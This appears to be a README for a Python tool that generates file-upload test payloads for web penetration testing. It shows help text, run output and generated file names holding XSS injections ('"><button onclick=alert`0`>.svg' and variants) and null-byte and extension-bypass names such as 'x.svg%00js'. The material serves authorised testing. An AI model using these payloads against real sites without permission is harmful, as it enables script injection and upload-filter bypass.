# FileUploadPayloadGenerator
Used To Generate A Number Of Payloads Given A file

```
User$ python payloadGen.py --help

usage: payloadGen.py -f FILE [FILE ...] [-a] [-e] [-x] [-h] [-v]

Given A File, This Will Produce Various Files That Can Be Used During Web
Penetration Testing Engagements.

required arguments:
  -f FILE [FILE ...], --file FILE [FILE ...]
                        files to create payloads from

optional arguments:
  -a, --all             create xss file payloads and file extension bypass
                        payloads (Default)
  -e, --ext             create file extension bypass payloads
  -x, --xss             create xss file payloads
  -h, --help            show this help message and exit
  -v, --verbose         display information verbosely
```

```
User$ python payloadGen.py -f x.svg -a

Payload Generator: XSS in filename & Extension bypass
By: IΛMGӨÐ
INFO: Loading Config File
INFO: Program Starting
INFO: Reading Payload Directories From Config File
INFO: Reading XSS Payload From Config File
INFO: Program Complete!
INFO: Reading File Extension Payloads From Config File
INFO: Program Complete!
```

```
User$ ls
_SVG
```

```
User$ ls _SVG
_FileTypeBypass	_XSSName
```

```
$User ls _SVG/_XSSName/
"><button onclick= alert`0`>.svg
"><button onclick= confirm`0`>.svg
"><button onclick= console.log`0`>.svg
"><button onclick= prompt`0`>.svg
"><button onclick=alert`0`>.svg
"><button onclick=confirm`0`>.svg
"><button onclick=console.log`0`>.svg
...
...
...
```

```
$User ls _SVG/_FileTypeBypass
x.svg .csv
x.svg;doc
x.svg%00js
x.svg%0Dpdf
...
...
...
```
